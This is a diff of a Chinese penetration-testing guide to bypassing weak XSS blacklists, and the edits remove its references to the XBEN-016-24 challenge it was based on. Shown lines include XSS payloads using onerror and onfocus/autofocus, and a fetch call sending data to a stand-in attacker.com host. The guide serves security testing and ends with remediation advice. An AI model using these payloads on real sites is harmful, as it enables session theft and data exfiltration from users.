@@ -1,10 +1,10 @@
-# XSS 黑名单绕过技术（XBEN-016-24 实战）
+# XSS 黑名单绕过技术
 
 ## 1. 文档概述
 
 ### 1.1 编写目的
 
-本文档基于 XBEN-016-24 "Cross 13" XSS 挑战的实战分析，为渗透测试人员提供一套系统化的 XSS 黑名单绕过技术方法论。重点针对弱黑名单过滤、HTML 属性上下文注入、事件处理器绕过等场景，帮助测试人员发现和利用 XSS 漏洞。
+本文档为渗透测试人员提供一套系统化的 XSS 黑名单绕过技术方法论。重点针对弱黑名单过滤、HTML 属性上下文注入、事件处理器绕过等场景，帮助测试人员发现和利用 XSS 漏洞。
 
 ### 1.2 适用范围
 
@@ -32,7 +32,7 @@
 
 弱黑名单过滤是指应用仅过滤少量已知的危险关键词（如 `script`、`onerror`、`onclick` 等），但未对所有可能的 XSS 向量进行全面过滤。这种过滤方式本质上是"安全通过隐匿"（Security by Obscurity），极易被绕过。
 
-**XBEN-016-24 典型黑名单：**
+**典型黑名单：**
 
 ```python
 # Flask 应用典型弱黑名单代码
@@ -208,7 +208,7 @@ curl -s "http://target/page?name=TESTVALUE" | grep -i "TESTVALUE"
 <input type=text name=name placeholder="..." > <img src=x onerror=alert(1)>>
 ```
 
-**XBEN-016-24 实战 Payload：**
+**实战 Payload：**
 
 ```bash
 # 目标应用自动在输入前添加 ">
@@ -233,7 +233,7 @@ curl -s "http://target/page?name=TESTVALUE" | grep -i "TESTVALUE"
 <input value="" onfocus="alert(1)" autofocus="">
 ```
 
-#### 2.4.5 完整利用链（XBEN-016-24 实战）
+#### 2.4.5 完整利用链
 
 **目标环境：**
 - URL: `http://localhost:41185/page?name=<payload>`
@@ -432,9 +432,3 @@ fetch('http://attacker.com/log', {
 | 标签未过滤 | 实施严格的输入验证 |
 | 无 CSP 保护 | 添加 `Content-Security-Policy: default-src 'self'` |
 | X-XSS-Protection 禁用 | 设置 `X-XSS-Protection: 1; mode=block` |
-
----
-
-**文档版本：** 1.0
-**最后更新：** 2026 年 3 月
-**参考来源：** XBEN-016-24 "Cross 13" 渗透测试实战分析
